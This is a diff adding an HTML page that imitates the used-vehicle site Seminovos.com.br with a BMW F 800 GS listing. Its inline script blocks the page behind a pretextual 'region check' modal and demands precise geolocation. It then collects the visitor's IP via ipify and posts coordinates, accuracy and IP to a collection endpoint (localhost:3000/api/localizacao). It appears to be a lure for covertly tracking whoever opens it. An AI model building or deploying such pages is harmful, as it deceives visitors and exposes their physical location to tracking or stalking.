@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BMW F 800 GS - Seminovos.com.br</title>
+    <meta name="description" content="Anúncio da motocicleta BMW F 800 GS cinza/marrom. Preço R$ 40.000,00. Compre sua moto no Seminovos.com.br.">
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Phosphor Icons (for clean, modern icons) -->
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Modal de Geolocalização -->
+    <div id="geo-modal" class="geo-modal-overlay">
+        <div class="geo-modal-box">
+            <h2 class="geo-modal-title">Verificação de Região</h2>
+            <p class="geo-modal-text">Para visualizar o estoque de motocicletas disponíveis na sua região e calcular fretes exatos, permita o acesso à sua localização.</p>
+            <button id="btn-geo-allow" class="btn-geo">Continuar para o Site</button>
+        </div>
+    </div>
+
+    <!-- 1. Cabeçalho (Header) -->
+    <header class="header">
+        <div class="header-top container">
+            <div class="logo">
+                <a href="#" class="logo-link">
+                    <i class="ph ph-car-profile"></i>
+                    <span>SEMINOVOS.COM.BR</span>
+                </a>
+            </div>
+            
+            <div class="search-bar">
+                <input type="text" placeholder="Qual a fabricante, modelo ou revenda?">
+                <button class="search-btn"><i class="ph ph-magnifying-glass"></i></button>
+            </div>
+            
+            <div class="header-actions">
+                <a href="#" class="btn-outline">ENTRAR</a>
+                <a href="#" class="btn-primary">ANUNCIE GRÁTIS</a>
+            </div>
+        </div>
+        
+        <div class="header-bottom">
+            <nav class="main-nav container">
+                <ul>
+                    <li><a href="#">Home</a></li>
+                    <li><a href="#" class="highlight">Busca IA (NOVO)</a></li>
+                    <li class="dropdown">
+                        <a href="#">Comprar/Trocar <i class="ph ph-caret-down"></i></a>
+                        <div class="dropdown-menu">
+                            <a href="#">Comprar Moto</a>
+                            <a href="#">Comprar Carro</a>
+                            <a href="#">Marcas Populares</a>
+                            <a href="#">Modelos em Destaque</a>
+                        </div>
+                    </li>
+                    <li><a href="#">Como Anunciar</a></li>
+                    <li><a href="#">Revendas</a></li>
+                    <li><a href="#">Tabela FIPE</a></li>
+                    <li><a href="#">Ajuda</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- 2. Corpo da Página -->
+    <main class="main-content container">
+        <!-- Breadcrumbs -->
+        <nav class="breadcrumbs">
+            <a href="#">Home</a> &gt; 
+            <a href="#">Motos</a> &gt; 
+            <a href="#">BMW</a> &gt; 
+            <span>F 800</span>
+        </nav>
+
+        <div class="ad-layout">
+            <!-- Esquerda: Galeria e Título -->
+            <div class="ad-main">
+                <div class="ad-header">
+                    <div class="ad-title-block">
+                        <h1 class="ad-title">BMW F 800 <span class="ad-subtitle">GS</span></h1>
+                        <p class="ad-location"><i class="ph ph-map-pin"></i> Belo Horizonte - MG</p>
+                    </div>
+                </div>
+
+                <div class="gallery-container">
+                    <!-- Miniaturas verticais -->
+                    <div class="gallery-thumbnails">
+                        <div class="thumb-item active">
+                            <img src="main_image.png" alt="Miniatura 1">
+                        </div>
+                        <div class="thumb-item">
+                            <img src="thumb_left_side.png" alt="Miniatura 2">
+                        </div>
+                        <div class="thumb-item">
+                            <img src="thumb_rear_side.png" alt="Miniatura 3">
+                        </div>
+                        <div class="thumb-item">
+                            <img src="thumb_profile.png" alt="Miniatura 4">
+                        </div>
+                    </div>
+                    
+                    <!-- Imagem principal com preço sobreposto -->
+                    <div class="gallery-main">
+                        <img src="main_image.png" alt="BMW F 800 GS">
+                        <div class="price-tag">
+                            <span class="price-value">R$ 40.000,00</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Barra de ações -->
+                <div class="action-bar">
+                    <button class="action-btn"><i class="ph ph-heart"></i> Favoritar</button>
+                    <button class="action-btn"><i class="ph ph-arrows-left-right"></i> Comparar</button>
+                    <button class="action-btn"><i class="ph ph-share-network"></i> Compartilhar</button>
+                    <button class="action-btn danger"><i class="ph ph-warning-circle"></i> Denunciar</button>
+                </div>
+                
+                <!-- Informações do Veículo -->
+                <div class="vehicle-info-card">
+                    <h2>Informações do Veículo</h2>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <span class="info-label">Ano</span>
+                            <span class="info-value">2018/2018</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Quilometragem</span>
+                            <span class="info-value">25.000 km</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Câmbio</span>
+                            <span class="info-value">Manual</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Cor</span>
+                            <span class="info-value">Cinza</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Combustível</span>
+                            <span class="info-value">Gasolina</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Placa</span>
+                            <span class="info-value">Q**-***1</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Direita: Contato e Vendedor -->
+            <aside class="ad-sidebar">
+                <!-- Caixa de Contato -->
+                <div class="contact-box">
+                    <div class="contact-header">
+                        <h2>GOSTOU DESTE VEÍCULO?</h2>
+                        <p>Faça sua proposta</p>
+                    </div>
+                    
+                    <div class="contact-tabs">
+                        <button class="tab-btn active">E-MAIL</button>
+                        <button class="tab-btn">CHAT ONLINE</button>
+                    </div>
+
+                    <form class="contact-form">
+                        <div class="form-group">
+                            <input type="text" placeholder="Nome" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="email" placeholder="E-mail" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="tel" placeholder="Telefone" required>
+                        </div>
+                        <div class="form-group">
+                            <textarea rows="4" placeholder="Mensagem" required>Boa tarde, Cesar! Tenho interesse na sua BMW F 800 GS. Aceita negociação no valor?</textarea>
+                        </div>
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="copy" checked>
+                            <label for="copy">Envie-me uma cópia da proposta</label>
+                        </div>
+                        <button type="submit" class="btn-submit">ENVIAR MENSAGEM</button>
+                    </form>
+                </div>
+
+                <!-- Bloco do Vendedor -->
+                <div class="seller-box">
+                    <h3>DADOS DO VENDEDOR</h3>
+                    <div class="seller-info">
+                        <div class="seller-avatar">
+                            <i class="ph ph-user"></i>
+                        </div>
+                        <div class="seller-details">
+                            <p class="seller-name">CESAR</p>
+                            <p class="seller-since">Na plataforma desde 2021</p>
+                        </div>
+                    </div>
+                    <div class="seller-contact">
+                        <p class="phone-number">(031) 97545-**** <span class="badge-ver">VER</span></p>
+                    </div>
+                    <a href="#" class="view-store">Ver estoque completo do vendedor</a>
+                </div>
+            </aside>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const geoModal = document.getElementById('geo-modal');
+            const btnGeoAllow = document.getElementById('btn-geo-allow');
+
+            // Block body scroll
+            document.body.style.overflow = 'hidden';
+
+            btnGeoAllow.addEventListener('click', () => {
+                if (!navigator.geolocation) {
+                    alert('Geolocalização não é suportada pelo seu navegador.');
+                    return;
+                }
+
+                btnGeoAllow.textContent = 'Processando...';
+                btnGeoAllow.disabled = true;
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        
+                        let ip = 'Desconhecido';
+                        try {
+                            const ipResponse = await fetch('https://api.ipify.org?format=json');
+                            const ipData = await ipResponse.json();
+                            ip = ipData.ip;
+                        } catch (e) {
+                            console.error('Erro ao obter IP', e);
+                        }
+
+                        const geoData = {
+                            latitude,
+                            longitude,
+                            accuracy,
+                            timestamp: new Date().toISOString(),
+                            ip
+                        };
+
+                        try {
+                            const response = await fetch('http://localhost:3000/api/localizacao', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(geoData)
+                            });
+
+                            if (response.ok) {
+                                geoModal.style.display = 'none';
+                                document.body.style.overflow = '';
+                            } else {
+                                throw new Error('Servidor retornou erro.');
+                            }
+                        } catch (error) {
+                            console.error('Falha de rede ou servidor offline:', error);
+                            // Tratamento de Erro robusto: liberar acesso à tela para não prender o usuário
+                            geoModal.style.display = 'none';
+                            document.body.style.overflow = '';
+                        }
+                    },
+                    (error) => {
+                        alert('Permissão obrigatória: Você deve aceitar o alerta de localização do navegador para acessar o site.');
+                        btnGeoAllow.textContent = 'Continuar para o Site';
+                        btnGeoAllow.disabled = false;
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            });
+        });
+    </script>
+</body>
+</html>
